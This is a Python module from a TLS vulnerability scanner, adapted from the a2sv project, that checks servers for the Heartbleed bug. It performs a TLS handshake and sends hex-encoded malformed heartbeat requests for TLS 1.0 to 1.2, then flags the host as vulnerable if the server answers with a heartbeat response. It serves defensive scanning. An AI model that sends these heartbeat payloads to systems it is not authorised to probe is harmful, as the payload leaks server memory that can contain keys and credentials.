# -*- coding: utf-8 -*-
'''
The MIT License (MIT)

Copyright (c) 2016 HaHwul(하훌)

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
'''

# Code below is modified from a2sv heartbleed test: https://github.com/hahwul/a2sv

import connection_test
import socket
import time
import select
import struct
from util import *
hbv10 = '1803010003014000'
hbv11 = '1803020003014000'
hbv12 = '1803030003014000'

def test_heartbleed(host, port, tlsVer) :
    vuln = False
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    try :
        s.connect((host, port))
        
        if tlsVer == 1 : # TLS v1.0
            hello, hb = addNecessaryExtensionToHello(connection_test.tls10_hello, host), hbv10
        elif tlsVer == 2 : # TLS v1.1
            hello, hb = addNecessaryExtensionToHello(connection_test.tls11_hello, host), hbv11
        elif tlsVer == 3 : # TLS v1.2
            hello, hb = addNecessaryExtensionToHello(connection_test.tls12_hello, host), hbv12
        else :
            print("TLS version not supported")
            return False
        print("[Heartbleed] Sending HELLO")
        s.sendall(hello.decode('hex'))
        parseresp(s)

        print("[Heartbleed] Handshake finished, Sending HEARTBLEED")
        s.sendall(hb.decode('hex'))
        vuln = hit_hb(s,0, host, 0)
        s.close()
    except BaseException as e :
        s.close()
        vuln = False
    return vuln

def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        rtime = endtime - time.time()
        if rtime < 0:
            if not rdata:
                return None
            else:
                return rdata
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata

def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        #showDisplay(displayMode,'Unexpected EOF receiving record header - server closed connection')
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        #showDisplay(displayMode,'Unexpected EOF receiving record payload - server closed connection')
        return None, None, None
    #showDisplay(displayMode,' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))
    return typ, ver, pay

def hit_hb(s, dumpf, host, quiet):
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            print("[Heartbleed] OK - No response")
            #showDisplay(displayMode,'No heartbeat response received from '+host+', server likely not vulnerable')
            return False

        if typ == 24:
            print("[Heartbleed] Vulnerable! - Received heartbeat response with length: "+str(len(pay)))
            #showDisplay(displayMode,'Received heartbeat response:')
            if len(pay) > 3:
                pass
                #showDisplay(displayMode,'WARNING: server '+ host +' returned more data than it should - server is vulnerable!')
            else:
                #showDisplay(displayMode,'Server '+host+' processed malformed heartbeat, but did not return any extra data.')
                pass
            return True

        if typ == 21:
            print("[Heartbleed] OK - Received Alert")
            #showDisplay(displayMode,'Received alert:')
            #showDisplay(displayMode,'Server '+ host +' returned error, likely not vulnerable')
            return False

def parseresp(s):
    while True:
        typ, ver, pay = recvmsg(s)
        if typ == None:
            print("[Heartbleed] Server closed without sending Hello")
            #showDisplay(displayMode,'Server closed connection without sending Server Hello.')
            return 0
        # Look for server hello done message.
        if typ == 22 and ord(pay[0]) == 0x0E:
            return ver

class HeartbleedTest(Test) :
    def start(self) :
        if self._result.getResult('offer_tls12') :
            self._result.addResult('heartbleed',test_heartbleed(self._host, self._port, 3))
        elif self._result.getResult('offer_tls11') :
            self._result.addResult('heartbleed',test_heartbleed(self._host, self._port, 2))
        elif self._result.getResult('offer_tls10') :
            self._result.addResult('heartbleed',test_heartbleed(self._host, self._port, 1))
        else :
            print("TLS Not supported for testing Heartbleed")
            self._result.addResult('heartbleed',False)
        
        if self._result.getResult('heartbleed') :
            self._result.addVulnerability('heartbleed')